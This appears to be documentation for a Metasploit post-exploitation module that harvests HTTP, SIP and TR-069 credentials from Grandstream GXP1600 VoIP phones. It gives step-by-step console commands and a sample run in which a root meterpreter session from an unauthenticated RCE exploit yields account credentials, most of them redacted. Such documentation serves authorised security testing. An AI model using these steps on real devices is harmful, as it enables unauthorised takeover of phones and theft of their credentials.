## Vulnerable Application
This gather module works against Grandstream GXP1600 series VoIP devices and can collect HTTP, SIP, and TR-069
credentials from a device. You can first leverage the `exploit/linux/http/grandstream_gxp1600_unauth_rce` exploit
module to get a root session on a target GXP1600 series device before running this post module.

## Testing
This module was verified on a GXP1630 device running firmware version 1.0.7.78.

## Verification Steps

1. Leverage the `exploit/linux/http/grandstream_gxp1600_unauth_rce` exploit module to get a root session on a
target GXP1600 series device.
2. `use post/linux/gather/grandstream_gxp1600_creds`

Specify the target session to run this post module against:

3. `sessions -l`
4. `set SESSION <SESSION_ID>`

Run the module to gather credentials:

5. `run`

## Scenarios

### Example 1

NOTE: All credential information below has been redacted via `*` characters.

```
msf exploit(linux/http/grandstream_gxp1600_unauth_rce) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter armle/linux  root @ gxp1630_c074ade84b53  192.168.86.122:4444 -> 192.168.86.77:59112 (192.168.86.77)

msf exploit(linux/http/grandstream_gxp1600_unauth_rce) > use post/linux/gather/grandstream_gxp1600_creds 
msf post(linux/gather/grandstream_gxp1600_creds) > set SESSION 1
SESSION => 1
msf post(linux/gather/grandstream_gxp1600_creds) > show options 

Module options (post/linux/gather/grandstream_gxp1600_creds):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


View the full module info with the info, or info -d command.

msf post(linux/gather/grandstream_gxp1600_creds) > run
[*] Module running against phone model GXP1630
[+] Gathered HTTP account admin:********
[+] Gathered HTTP account user:123
[+] Gathered SIP account <sip:**********@***************:8060;transport=udp> with a password of ********
[+] Gathered SIP account <sip:************@*********************:5060;transport=udp> with a password of **********
[*] Post module execution completed
msf post(linux/gather/grandstream_gxp1600_creds) >
```
